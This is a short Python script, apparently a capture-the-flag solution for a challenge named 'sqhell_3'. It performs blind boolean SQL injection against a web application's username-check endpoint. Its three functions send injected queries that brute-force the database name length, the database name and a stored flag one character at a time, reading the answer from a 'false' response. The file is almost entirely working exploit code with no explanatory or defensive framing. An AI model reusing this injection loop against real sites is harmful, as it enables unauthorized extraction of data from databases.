import time
import requests
def database_name():
    flag =""
    count=1
    for i in range(8):
        for a in range(48,126):
            req=requests.get(url=f"ip/user-check?username=admin' AND (ASCII(SUBSTR((select database()),{count},1))) = {a} --+")          
            if 'false' in req.text:
                flag+=chr(a)
                count+=1
                print(f"Flag is {flag}")
                break


def database_length(): 
    for i in range(100):
        req=requests.get(url=f"http://ip/register/user-check?username=admin%27%20AND%20(length(database()))%20=%20{i}%20--+;")
        if 'false' in req.text:
            print(f"database length is {i}")
        else:
            print(f"database length is not {i}") 


def flag_value():
    flag =""
    count=1
    while chr(125) not in flag:
        for a in range(48,126):
            req=requests.get(url=f"http://ip/register/user-check?username=admin' AND (ASCII(SUBSTR((select flag from sqhell_3.flag),{count},1))) = {a} --+")          
            if 'false' in req.text:
                flag+=chr(a)
                count+=1
                print(f"Flag is {flag}")
                break


